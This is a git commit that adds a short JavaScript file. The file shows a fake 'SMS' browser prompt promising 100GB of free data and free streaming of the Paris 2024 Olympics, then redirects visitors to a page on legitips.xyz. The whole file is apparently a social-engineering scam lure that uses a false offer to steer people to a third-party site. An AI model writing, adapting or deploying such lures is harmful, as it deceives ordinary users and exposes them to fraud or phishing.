92ffee91ef9dd7e2dbca6500a6c42f1da5629123
legitips <83867893+legitips@users.noreply.github.com>
2024-07-28 02:29:35 -0700

    Create activation-olympics-paris2024.js

---
+++ activation-olympics-paris2024.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('SMS: Congratulations you are to Receive 100GB Free Data and Watch Olympics Paris 2024 Online, Kindly press 1 to ACTIVATE ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/olympics-paris2024.html';
+}
